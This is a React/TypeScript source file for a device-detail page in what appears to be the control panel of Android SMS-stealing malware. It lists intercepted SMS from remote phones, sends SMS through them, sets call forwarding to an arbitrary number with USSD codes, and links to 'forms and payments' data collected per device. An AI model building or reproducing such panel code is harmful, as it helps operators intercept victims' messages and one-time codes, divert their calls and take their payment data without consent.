// src/pages/DeviceDetailPage.tsx
import { useEffect, useMemo, useRef, useState, type FormEvent, type ReactNode } from "react";
import { useNavigate, useParams } from "react-router-dom";

import wsService from "../services/ws/wsService";
import { getDevice } from "../services/api/devices";
import { listDeviceNotifications, deleteDeviceNotifications } from "../services/api/sms";
import Modal from "../components/ui/Modal";

import pageBg from "../assets/login-bg.png";

type TabKey = "overview" | "sms" | "forwarding" | "userdata";
type ForwardState = "idle" | "pending" | "active" | "inactive" | "failed";

function safeString(v: any): string {
  if (v === null || v === undefined) return "";
  return String(v);
}

function firstNonEmpty(...vals: any[]): string {
  for (const v of vals) {
    const s = safeString(v).trim();
    if (s) return s;
  }
  return "";
}

function getTimestamp(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function getKeyValuePairs(obj: any): Array<{ label: string; value: string }> {
  if (!obj || typeof obj !== "object") return [];
  const pairs: Array<{ label: string; value: string }> = [];
  for (const k of Object.keys(obj)) {
    const v = (obj as any)[k];
    if (typeof v === "object") continue;
    const s = safeString(v).trim();
    if (s) pairs.push({ label: k, value: s });
  }
  return pairs;
}

function extractSimSummary(simInfo: any): { count: number; sim1: string; sim2: string } {
  if (!simInfo || typeof simInfo !== "object") return { count: 0, sim1: "-", sim2: "-" };

  const simsArray = Array.isArray(simInfo.sims) ? simInfo.sims : Array.isArray(simInfo.sim) ? simInfo.sim : null;

  const sim1 =
    firstNonEmpty(
      simInfo?.sim1Number,
      simInfo?.sim1?.number,
      simInfo?.sim1?.phoneNumber,
      simInfo?.slot1?.number,
      simInfo?.slot1?.phoneNumber,
      simsArray?.[0]?.number,
      simsArray?.[0]?.phoneNumber,
      simsArray?.[0]?.line1Number,
      simsArray?.[0]?.msisdn
    ) || "-";

  const sim2 =
    firstNonEmpty(
      simInfo?.sim2Number,
      simInfo?.sim2?.number,
      simInfo?.sim2?.phoneNumber,
      simInfo?.slot2?.number,
      simInfo?.slot2?.phoneNumber,
      simsArray?.[1]?.number,
      simsArray?.[1]?.phoneNumber,
      simsArray?.[1]?.line1Number,
      simsArray?.[1]?.msisdn
    ) || "-";

  let count = 0;
  if (typeof simInfo.count === "number") count = simInfo.count;
  else if (typeof simInfo.simCount === "number") count = simInfo.simCount;
  else if (Array.isArray(simsArray)) count = simsArray.length;
  else count = [sim1, sim2].filter((x) => x && x !== "-").length;

  return { count, sim1, sim2 };
}

function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
      <div className="pointer-events-none absolute inset-0">
        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
      </div>

      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />

      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 border-l-2 border-t-2 border-cyan-200/50 rounded-tl-[10px]" />
      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 border-r-2 border-t-2 border-cyan-200/50 rounded-tr-[10px]" />
      <div className="pointer-events-none absolute left-3 bottom-3 h-6 w-6 border-l-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />
      <div className="pointer-events-none absolute right-3 bottom-3 h-6 w-6 border-r-2 border-b-2 border-cyan-200/50 rounded-bl-[10px]" />

      <div
        className={[
          "relative rounded-[26px] px-4 py-4",
          "bg-white/[0.055]",
          "border border-white/[0.16]",
          "backdrop-blur-3xl backdrop-saturate-[1.6]",
          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
        ].join(" ")}
      >
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
          style={{
            backgroundImage:
              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
          }}
        />
        <div
          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
          style={{
            backgroundImage:
              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
          }}
        />
        <div className="relative">{children}</div>
      </div>
    </div>
  );
}

function normalizeEvent(msg: any): { type: string; event: string; deviceId: string; data: any } {
  const type = safeString(msg?.type);
  const event = safeString(msg?.event);
  const deviceId = safeString(msg?.deviceId ?? msg?.id ?? msg?.uniqueid ?? msg?.data?.uniqueid);
  const data = msg?.data ?? msg?.payload ?? {};
  return { type, event, deviceId, data };
}

export default function DeviceDetailPage() {
  const { deviceId = "" } = useParams<{ deviceId: string }>();
  const nav = useNavigate();

  const did = decodeURIComponent(deviceId || "");
  const mountedRef = useRef(true);

  const [activeTab, setActiveTab] = useState<TabKey>("overview");

  const [device, setDeviceDoc] = useState<any | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [smsList, setSmsList] = useState<any[]>([]);
  const [loadingSms, setLoadingSms] = useState(false);

  // ===== Send SMS (WS) =====
  const [sendOpen, setSendOpen] = useState(false);
  const [receiver, setReceiver] = useState<string>("");
  const [messageBody, setMessageBody] = useState<string>("");
  const [smsSimSlot, setSmsSimSlot] = useState<0 | 1>(0);
  const [sendingSms, setSendingSms] = useState(false);
  const sendLockRef = useRef(false);

  const simSummary = useMemo(() => extractSimSummary(device?.simInfo), [device]);

  // WS status (live)
  const [wsOnline, setWsOnline] = useState<boolean | null>(null);
  const [wsLastSeen, setWsLastSeen] = useState<number | null>(null);

  // ===== Call forwarding (WS) =====
  const [forwardingSimDraft, setForwardingSimDraft] = useState<"1" | "2">("1");
  const [forwardingNumberDraft, setForwardingNumberDraft] = useState<string>("");
  const [forwardState, setForwardState] = useState<ForwardState>("idle");
  const [forwardMsg, setForwardMsg] = useState<string>("");

  const simLabel = useMemo(() => (forwardingSimDraft === "1" ? "SIM 1" : "SIM 2"), [forwardingSimDraft]);

  async function loadDevice() {
    setLoading(true);
    setError(null);
    try {
      const d = await getDevice(did);
      if (!mountedRef.current) return;

      setDeviceDoc(d);

      const simRaw = firstNonEmpty(d?.metadata?.forwardingSim, d?.forwardingSim, "1") || "1";
      setForwardingSimDraft(simRaw === "2" ? "2" : "1");

      const num = firstNonEmpty(d?.metadata?.forwardingNumber, d?.forwardingNumber, "") || "";
      setForwardingNumberDraft(num);
    } catch (e) {
      console.error("loadDevice failed", e);
      if (!mountedRef.current) return;
      setDeviceDoc(null);
      setError("Failed loading device");
    } finally {
      if (mountedRef.current) setLoading(false);
    }
  }

  async function loadSms() {
    setLoadingSms(true);
    try {
      const list = await listDeviceNotifications(did);
      if (!mountedRef.current) return;
      const sorted = (list || []).slice().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
      setSmsList(sorted);
    } catch (e) {
      console.warn("loadSms failed", e);
      if (!mountedRef.current) return;
      setSmsList([]);
    } finally {
      if (mountedRef.current) setLoadingSms(false);
    }
  }

  // ✅ Connect WS ONLY ONCE (prevents multiple sockets -> duplicate sends)
  useEffect(() => {
    wsService.connect();
  }, []);

  // ✅ WS subscriptions (NO connect() here)
  useEffect(() => {
    const off = wsService.onMessage((msg) => {
      const { type, event, deviceId: evDid, data } = normalizeEvent(msg);

      if ((type === "event" && event === "status" && evDid === did) || (type === "status" && evDid === did)) {
        const onlineAny = data?.online ?? (msg as any)?.online;
        const online =
          typeof onlineAny === "boolean"
            ? onlineAny
            : typeof onlineAny === "number"
            ? onlineAny !== 0
            : typeof onlineAny === "string"
            ? onlineAny.toLowerCase() === "true"
            : null;

        const tsAny = data?.timestamp ?? data?.lastSeen ?? (msg as any)?.timestamp ?? (msg as any)?.lastSeen ?? null;
        const tsNum = tsAny !== null ? Number(tsAny) : NaN;

        if (online !== null) setWsOnline(online);
        if (!Number.isNaN(tsNum) && tsNum > 0) setWsLastSeen(tsNum);
        return;
      }

      if (type === "event" && event === "simSlots" && evDid === did) {
        const s0 = safeString(data?.["0"]?.status ?? data?.["0"] ?? "").toLowerCase();
        const s1 = safeString(data?.["1"]?.status ?? data?.["1"] ?? "").toLowerCase();

        const slotKey = forwardingSimDraft === "1" ? "0" : "1";
        const st = slotKey === "0" ? s0 : s1;

        if (st === "active") {
          setForwardState("active");
          setForwardMsg("✅ Device confirmed: ACTIVE");
        } else if (st === "inactive") {
          setForwardState("inactive");
          setForwardMsg("❌ Device confirmed: INACTIVE");
        } else if (st === "pending") {
          setForwardState("pending");
          setForwardMsg("⏳ Pending…");
        }
        return;
      }

      if (
        (type === "event" && event === "call_forward:result") ||
        event === "call_forward:result" ||
        type === "call_forward:result"
      ) {
        const d2 = data || {};
        const id2 = safeString(d2?.uniqueid ?? evDid);
        if (id2 !== did) return;

        const status = safeString(d2?.status ?? "").toLowerCase();
        if (status === "success" || status === "ok" || status === "done") {
          setForwardState("active");
          setForwardMsg("✅ Success");
        } else if (status === "pending") {
          setForwardState("pending");
          setForwardMsg("⏳ Pending…");
        } else {
          setForwardState("failed");
          setForwardMsg("❌ Failed");
        }
      }
    });

    return () => {
      off();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [did, forwardingSimDraft]);

  useEffect(() => {
    mountedRef.current = true;
    if (!did) return;

    loadDevice();
    loadSms();

    return () => {
      mountedRef.current = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [did]);

  async function handleDeleteAllSms() {
    if (!confirm("Delete all notifications for this device?")) return;
    try {
      await deleteDeviceNotifications(did);
      setSmsList([]);
      alert("Deleted");
    } catch {
      alert("Failed to delete notifications");
    }
  }

  async function handleSendSmsWs(e?: FormEvent) {
    if (e) e.preventDefault();

    // ✅ hard lock to avoid double-fire
    if (sendLockRef.current || sendingSms) return;

    const to = receiver.trim();
    if (!to) {
      alert("Receiver is required");
      return;
    }

    const body = messageBody.trim();
    if (!body) {
      alert("Message is required");
      return;
    }

    sendLockRef.current = true;
    setSendingSms(true);

    try {
      const ok = wsService.sendCmd("sendSms", {
        address: to,
        message: body,
        sim: smsSimSlot,
        timestamp: Date.now(),
        uniqueid: did,
        deviceId: did,
      });

      if (!ok) throw new Error("WebSocket not connected");

      setReceiver("");
      setMessageBody("");
      setSendOpen(false);
      alert("SMS command sent (WS)");
    } catch (err) {
      console.error("sendSms ws failed", err);
      alert("WebSocket not connected — SMS command not sent");
    } finally {
      setSendingSms(false);
      setTimeout(() => {
        sendLockRef.current = false;
      }, 400);
    }
  }

  function sendCallForwardCommand(mode: "activate" | "deactivate") {
    const num = forwardingNumberDraft.trim();

    if (mode === "activate") {
      if (!/^\d{10}$/.test(num) && !/^\+?\d{10,15}$/.test(num)) {
        alert("Enter valid forwarding number");
        return;
      }
    }

    const ussd = mode === "activate" ? `**21*${num}#` : "##21#";

    setForwardState("pending");
    setForwardMsg("⏳ Command queued (pending)");

    const ok = wsService.sendCmd("call_forward", {
      uniqueid: did,
      phoneNumber: mode === "activate" ? num : "",
      sim: simLabel,
      callCode: ussd,
      timestamp: Date.now(),
    });

    if (!ok) {
      setForwardState("failed");
      setForwardMsg("❌ WebSocket not connected — command not sent");
      alert("WebSocket not connected. Try again.");
    }
  }

  const statusLine = useMemo(() => {
    const online = wsOnline ?? device?.status?.online ?? null;
    const ts = wsLastSeen ?? device?.status?.timestamp ?? null;

    const label = online === true ? "Online" : online === false ? "Offline" : "Unknown";
    const cls =
      online === true
        ? "text-green-200 font-extrabold"
        : online === false
        ? "text-red-200 font-extrabold"
        : "text-white/70 font-extrabold";

    return { label, cls, ts };
  }, [wsOnline, wsLastSeen, device]);

  const forwardPill = useMemo(() => {
    if (forwardState === "pending") return "bg-yellow-500/15 text-yellow-100 border-yellow-300/25";
    if (forwardState === "active") return "bg-green-500/15 text-green-100 border-green-300/25";
    if (forwardState === "inactive") return "bg-red-500/15 text-red-100 border-red-300/25";
    if (forwardState === "failed") return "bg-red-500/15 text-red-100 border-red-300/25";
    return "bg-white/[0.06] text-white/85 border-white/14";
  }, [forwardState]);

  if (!did) return <div className="p-6">Missing device id</div>;

  return (
    <div className="relative w-full min-h-[100svh] overflow-x-hidden bg-black">
      <div className="absolute inset-0 bg-center bg-cover" style={{ backgroundImage: `url(${pageBg})` }} />
      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />

      <div className="pointer-events-none absolute inset-0 opacity-35">
        <div className="absolute -top-24 left-1/2 h-[460px] w-[460px] -translate-x-1/2 rounded-full blur-3xl bg-cyan-400/16" />
        <div className="absolute top-[35%] left-[-120px] h-[360px] w-[360px] rounded-full blur-3xl bg-blue-400/10" />
        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full blur-3xl bg-cyan-300/12" />
      </div>

      <div className="relative w-full max-w-[420px] mx-auto px-3 pb-24 pt-4">
        <TechGlassCard>
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-white">Device</div>
              <div className="text-[12px] text-white/60 break-all">{did}</div>

              <div className="text-[11px] text-white/45 mt-1">
                Status: <span className={statusLine.cls}>{statusLine.label}</span>
                {statusLine.ts ? (
                  <span className="text-white/40"> • Last seen {new Date(statusLine.ts).toLocaleString()}</span>
                ) : null}
              </div>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={() => nav("/devices")}
                className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 backdrop-blur-2xl hover:bg-white/[0.09]"
                type="button"
              >
                Back
              </button>
            </div>
          </div>

          {loading ? (
            <div className="mt-4 rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
              Loading…
            </div>
          ) : (
            <>
              <div className="mt-4 flex gap-2 overflow-x-auto no-scrollbar">
                {(
                  [
                    ["overview", "Overview"],
                    ["sms", "SMS"],
                    ["forwarding", "Call Forwarding"],
                    ["userdata", "View User Data"],
                  ] as Array<[TabKey, string]>
                ).map(([k, label]) => (
                  <button
                    key={k}
                    onClick={() => setActiveTab(k)}
                    className={[
                      "h-10 px-4 rounded-2xl text-[13px] font-semibold whitespace-nowrap",
                      "border border-white/[0.14]",
                      activeTab === k
                        ? "bg-cyan-400/90 border-cyan-200 text-black shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
                        : "bg-white/[0.06] text-white/85 hover:bg-white/[0.09]",
                    ].join(" ")}
                    type="button"
                  >
                    {label}
                  </button>
                ))}
              </div>

              {error && (
                <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
                  {error}
                </div>
              )}

              {activeTab === "overview" && (
                <div className="mt-4 space-y-3">
                  <div className="rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
                    <div className="flex items-center justify-between gap-2">
                      <div className="text-[14px] font-extrabold text-white">Overview</div>
                    </div>

                    <div className="mt-3 grid grid-cols-1 gap-3">
                      <div className="rounded-2xl border border-white/12 bg-white/[0.04] p-3">
                        <div className="text-[11px] text-white/55">SIMs</div>
                        <div className="text-[13px] text-white/85 mt-1">
                          Count: <span className="font-extrabold text-white">{simSummary.count}</span>
                        </div>
                        <div className="text-[12px] text-white/70 mt-2">
                          <div>
                            SIM 1: <span className="font-extrabold text-white">{simSummary.sim1}</span>
                          </div>
                          <div>
                            SIM 2: <span className="font-extrabold text-white">{simSummary.sim2}</span>
                          </div>
                        </div>
                      </div>

                      <div className="rounded-2xl border border-white/12 bg-white/[0.04] p-3">
                        <div className="text-[11px] text-white/55 mb-2">Metadata</div>
                        {getKeyValuePairs(device?.metadata).length === 0 ? (
                          <div className="text-[12px] text-white/50">No metadata</div>
                        ) : (
                          <div className="grid grid-cols-1 gap-2">
                            {getKeyValuePairs(device?.metadata).slice(0, 12).map((p) => (
                              <div key={p.label} className="flex items-start justify-between gap-2">
                                <div className="text-[11px] text-white/55">{p.label}</div>
                                <div className="text-[11px] font-extrabold text-white break-all text-right">{p.value}</div>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === "sms" && (
                <div className="mt-4 space-y-3">
                  <div className="rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
                    <div className="flex items-start justify-between gap-3">
                      <div className="min-w-0">
                        <div className="text-[14px] font-extrabold text-white">SMS</div>
                      </div>
                    </div>

                    {/* ✅ Always show Send button (same vibe as empty-state) + fit on all screens */}
                    <div className="mt-3 grid grid-cols-2 gap-2">
                      <button
                        onClick={() => setSendOpen(true)}
                        className="col-span-2 h-11 px-5 rounded-2xl border border-cyan-200 bg-cyan-400/90 text-black font-extrabold shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
                        type="button"
                      >
                        Send SMS (WS)
                      </button>

                      <button
                        onClick={() => loadSms()}
                        className="h-10 px-4 rounded-2xl border border-white/14 bg-white/[0.06] text-white/85 hover:bg-white/[0.09]"
                        type="button"
                      >
                        Refresh
                      </button>

                      <button
                        onClick={handleDeleteAllSms}
                        className="h-10 px-4 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 hover:bg-red-500/14"
                        type="button"
                      >
                        Delete All
                      </button>
                    </div>
                  </div>

                  <div className="space-y-3">
                    {loadingSms ? (
                      <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-5 text-center text-white/70">
                        Loading…
                      </div>
                    ) : smsList.length === 0 ? (
                      <div className="rounded-3xl border border-white/14 bg-white/[0.05] backdrop-blur-2xl p-6 text-center text-white/70">
                        <div className="min-h-[220px] flex flex-col items-center justify-center gap-4">
                          <div className="text-white/80 font-extrabold">No SMS found</div>
                          <div className="text-[12px] text-white/55 max-w-[260px]">
                            Is device pe koi stored notification nahi hai. Aap abhi WebSocket se SMS send kar sakte ho.
                          </div>

                          <button
                            onClick={() => setSendOpen(true)}
                            className="h-11 w-full max-w-[280px] px-5 rounded-2xl border border-cyan-200 bg-cyan-400/90 text-black font-extrabold shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
                            type="button"
                          >
                            Send SMS (WS)
                          </button>
                        </div>
                      </div>
                    ) : (
                      smsList.map((m: any) => {
                        const title = safeString(m.title || "New SMS").trim() || "New SMS";
                        const sender = safeString(m.sender || m.senderNumber || "unknown").trim() || "unknown";
                        const receiver2 = safeString(m.receiver || "").trim();
                        const body = safeString(m.body || "").trim();
                        const ts = getTimestamp(m);

                        return (
                          <div
                            key={m._id || m.id || m.timestamp || `${sender}-${receiver2}-${ts}`}
                            className={[
                              "w-full text-left relative",
                              "rounded-[26px] p-4",
                              "border border-white/14",
                              "bg-white/[0.055]",
                              "backdrop-blur-3xl backdrop-saturate-[1.6]",
                              "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
                              "overflow-hidden",
                            ].join(" ")}
                          >
                            <div className="pointer-events-none absolute -inset-2 rounded-[28px] blur-2xl bg-cyan-400/10" />

                            <div className="relative flex items-start justify-between gap-3">
                              <div className="min-w-0">
                                <div className="text-[14px] font-extrabold truncate min-w-0 text-white">{title}</div>

                                {/* ✅ No truncate here: show full sender + full receiver */}
                                <div className="mt-1 text-[12px] text-white/70 whitespace-normal break-words">
                                  <span className="text-white/60">From:</span>{" "}
                                  <span className="font-semibold text-white/85">{sender}</span>
                                  {receiver2 ? (
                                    <>
                                      <span className="text-white/45"> {" → "} </span>
                                      <span className="font-semibold text-white/85">{receiver2}</span>
                                    </>
                                  ) : null}
                                </div>
                              </div>

                              <div className="shrink-0 text-[11px] text-white/45">
                                {ts ? new Date(ts).toLocaleString() : "-"}
                              </div>
                            </div>

                            {body ? (
                              <div className="relative mt-3 text-[13px] text-white/85 whitespace-pre-wrap break-words">
                                {body}
                              </div>
                            ) : (
                              <div className="relative mt-3 text-[13px] text-white/45">—</div>
                            )}
                          </div>
                        );
                      })
                    )}
                  </div>

                  <Modal open={sendOpen} onClose={() => setSendOpen(false)} title="Send SMS (WebSocket)">
                    <form onSubmit={handleSendSmsWs} className="flex flex-col max-h-[75vh]">
                      <div className="flex-1 overflow-auto pr-1 pb-4">
                        <div className="text-xs text-gray-600 mb-2">SIM</div>
                        <div className="flex items-center gap-2 mb-3">
                          <button
                            type="button"
                            onClick={() => setSmsSimSlot(0)}
                            className={[
                              "h-10 px-4 rounded-2xl text-[13px] font-extrabold",
                              "border border-gray-200",
                              smsSimSlot === 0 ? "bg-[var(--brand)] text-white" : "bg-white text-gray-800",
                            ].join(" ")}
                          >
                            SIM 1
                          </button>
                          <button
                            type="button"
                            onClick={() => setSmsSimSlot(1)}
                            className={[
                              "h-10 px-4 rounded-2xl text-[13px] font-extrabold",
                              "border border-gray-200",
                              smsSimSlot === 1 ? "bg-[var(--brand)] text-white" : "bg-white text-gray-800",
                            ].join(" ")}
                          >
                            SIM 2
                          </button>
                        </div>

                        <div className="text-xs text-gray-600 mb-2">Receiver</div>
                        <input
                          value={receiver}
                          onChange={(e) => setReceiver(e.target.value)}
                          className="w-full border rounded px-3 py-2 text-sm"
                          placeholder="Receiver number"
                        />

                        <div className="mt-3">
                          <div className="text-xs text-gray-600 mb-1">Message</div>
                          <textarea
                            value={messageBody}
                            onChange={(e) => setMessageBody(e.target.value)}
                            className="w-full border rounded px-3 py-2 text-sm min-h-[170px]"
                            placeholder="Type message…"
                          />
                        </div>
                      </div>

                      <div className="shrink-0 pt-3 border-t bg-white">
                        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-end gap-2">
                          <button
                            type="button"
                            onClick={() => setSendOpen(false)}
                            className="h-11 w-full sm:w-auto px-4 border rounded text-sm bg-white"
                          >
                            Cancel
                          </button>
                          <button
                            type="submit"
                            disabled={sendingSms}
                            className="h-11 w-full sm:w-auto px-5 rounded text-sm bg-[var(--brand)] text-white disabled:opacity-60"
                          >
                            {sendingSms ? "Sending…" : "Send (WS)"}
                          </button>
                        </div>
                      </div>
                    </form>
                  </Modal>
                </div>
              )}

              {activeTab === "forwarding" && (
                <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
                  <div className="flex items-center justify-between gap-2">
                    <div>
                      <div className="text-[14px] font-extrabold text-white">Call Forwarding</div>
                      <div className="text-[12px] text-white/60 mt-1">Android-like WS command + realtime result</div>
                    </div>
                    <span className={["px-3 py-1 rounded-full text-[12px] font-extrabold border", forwardPill].join(" ")}>
                      {forwardState === "idle"
                        ? "Ready"
                        : forwardState === "pending"
                        ? "Pending"
                        : forwardState === "active"
                        ? "Active"
                        : forwardState === "inactive"
                        ? "Inactive"
                        : "Failed"}
                    </span>
                  </div>

                  {forwardMsg ? <div className="mt-2 text-[11px] text-white/55">{forwardMsg}</div> : null}

                  <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] p-4">
                    <div className="text-[12px] text-white/60 mb-2">Select SIM</div>

                    <div className="flex items-center gap-2 mb-3">
                      <button
                        type="button"
                        onClick={() => setForwardingSimDraft("1")}
                        className={[
                          "h-10 px-4 rounded-2xl text-[13px] font-extrabold",
                          "border border-white/14",
                          forwardingSimDraft === "1"
                            ? "bg-cyan-400/90 text-black border-cyan-200"
                            : "bg-white/[0.06] text-white/85",
                        ].join(" ")}
                      >
                        SIM 1
                      </button>
                      <button
                        type="button"
                        onClick={() => setForwardingSimDraft("2")}
                        className={[
                          "h-10 px-4 rounded-2xl text-[13px] font-extrabold",
                          "border border-white/14",
                          forwardingSimDraft === "2"
                            ? "bg-cyan-400/90 text-black border-cyan-200"
                            : "bg-white/[0.06] text-white/85",
                        ].join(" ")}
                      >
                        SIM 2
                      </button>
                    </div>

                    <div className="mb-4 text-[11px] text-white/60">
                      <div>
                        SIM 1: <span className="font-extrabold text-white">{simSummary.sim1}</span>
                      </div>
                      <div>
                        SIM 2: <span className="font-extrabold text-white">{simSummary.sim2}</span>
                      </div>
                    </div>

                    <div className="text-[12px] text-white/60 mb-2">Forwarding Number</div>
                    <input
                      value={forwardingNumberDraft}
                      onChange={(e) => setForwardingNumberDraft(e.target.value)}
                      className={[
                        "w-full h-11 rounded-2xl px-4 text-[14px]",
                        "text-white placeholder:text-white/35",
                        "bg-white/[0.06]",
                        "border border-white/[0.14]",
                        "backdrop-blur-2xl",
                        "outline-none",
                        "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
                      ].join(" ")}
                      placeholder="Enter number (10 digits / +country)"
                    />

                    <div className="mt-4 flex items-center justify-end gap-2">
                      <button
                        type="button"
                        onClick={() => sendCallForwardCommand("deactivate")}
                        className="h-11 px-5 rounded-2xl border border-red-400/25 bg-red-500/10 text-red-100 hover:bg-red-500/14 font-extrabold"
                      >
                        Deactivate
                      </button>
                      <button
                        type="button"
                        onClick={() => sendCallForwardCommand("activate")}
                        className="h-11 px-6 rounded-2xl border border-cyan-200 bg-cyan-400/90 text-black font-extrabold"
                      >
                        Activate
                      </button>
                    </div>

                    <div className="mt-3 text-[11px] text-white/45">
                      WS cmd: <span className="font-extrabold text-white">call_forward</span> • sim:{" "}
                      <span className="font-extrabold text-white">{simLabel}</span>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === "userdata" && (
                <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] backdrop-blur-2xl p-4">
                  <div className="text-[14px] font-extrabold text-white">View User Data</div>
                  <div className="text-[12px] text-white/60 mt-1">Forms / payments and other user-related data</div>

                  <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] p-4">
                    <div className="text-[13px] font-extrabold text-white">Forms & Payments</div>
                    <div className="text-[12px] text-white/60 mt-1">Open user data linked with this device</div>

                    <button
                      onClick={() => nav(`/forms?uniqueid=${encodeURIComponent(did)}`)}
                      className="mt-4 h-11 px-5 rounded-2xl border border-cyan-200 bg-cyan-400/90 text-black font-extrabold"
                      type="button"
                    >
                      Open Forms / Payments
                    </button>
                  </div>
                </div>
              )}
            </>
          )}
        </TechGlassCard>
      </div>
    </div>
  );
}